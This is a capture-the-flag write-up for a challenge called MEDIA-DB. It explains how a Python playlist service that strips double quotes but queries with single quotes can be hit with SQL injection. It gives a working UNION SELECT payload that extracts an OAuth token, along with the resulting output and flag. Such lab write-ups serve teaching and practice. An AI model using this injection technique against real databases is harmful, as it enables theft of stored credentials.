# MEDIA-DB

## Text
The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.

## Attachments
A python file, the same as the one running on the server we can connect to.

## Tools Used
* nc

## Solution
Looking at the code provided, the programmer removes `"` quotes from anything the user enters, but then uses `'` in later accesses to the database. This allows us to use `'` to inject our own SQL commands into the program.

Using this as an artist name, and whatever we want as a song name:
```
' UNION SELECT ( SELECT oauth_token FROM oauth_tokens ), 2 --
```

and then shuffling out songs gives us the following output:
```
choosing songs from random artist: ' UNION SELECT ( SELECT oauth_token FROM oauth_tokens ), 2 --

== new playlist ==
1: "2" by "CTF{fridge_cast_oauth_token_cahn4Quo}
"
```

Making our flag:
```
CTF{fridge_cast_oauth_token_cahn4Quo}
```
